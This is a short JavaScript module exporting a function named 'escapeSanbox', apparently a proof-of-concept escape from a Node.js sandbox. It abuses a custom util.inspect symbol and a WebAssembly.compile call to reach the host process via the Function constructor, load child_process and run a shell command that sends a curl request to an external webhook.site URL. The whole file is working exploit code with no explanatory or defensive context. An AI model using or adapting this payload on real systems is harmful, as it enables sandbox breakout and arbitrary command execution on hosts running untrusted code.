function escapeSanbox(ctx, req, res) {
    const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');

    obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
        inspect.constructor('return process')().mainModule.require('child_process').execSync('curl https://webhook.site/e4c4d30e-841b-43ee-8b63-8749c0066779');
    },
    valueOf: undefined,
    constructor: undefined,
}

WebAssembly.compile(obj).catch(()=>{});
}

module.exports = escapeSanbox;
